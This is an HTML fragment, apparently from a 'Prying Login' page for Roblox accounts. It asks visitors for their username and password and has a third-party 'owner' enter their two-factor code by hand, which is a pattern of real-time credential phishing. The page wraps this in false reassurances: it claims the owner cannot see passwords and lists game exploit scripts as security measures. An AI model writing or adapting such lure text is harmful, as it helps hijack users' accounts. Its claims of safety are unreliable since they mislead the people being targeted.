        <p>As the developer of Prying Login, I understand the importance of maintaining the security of your Roblox account. That is why we have implemented a measure in which the owner must manually enter the two-factor authentication (2FA) code during the login process. Please be assured that the owner does not have access to your account password and takes all necessary measures to ensure the confidentiality of your login information.


      
        </p>
               <p style=color:white>In order to ensure the security and confidentiality of your account, we require your username and password. This is to verify that you are the sole authorized user of this account and to prevent unauthorized sharing.</p>
                              <p style=color:white>This login is provided to select individuals for use on specific projects. It is not intended for public use at this time.

                              <p style=color:white>To ensure the security of your account and prevent unauthorized access, we have implemented several measures including limiting access to a select group of trusted individuals and utilizing scripts such as Potato Hub, Theme Park Tycoon 2 Script, Iris Hub, and Wally Revamped. We are committed to protecting your account from potential phishing attacks and other security threats.</p>
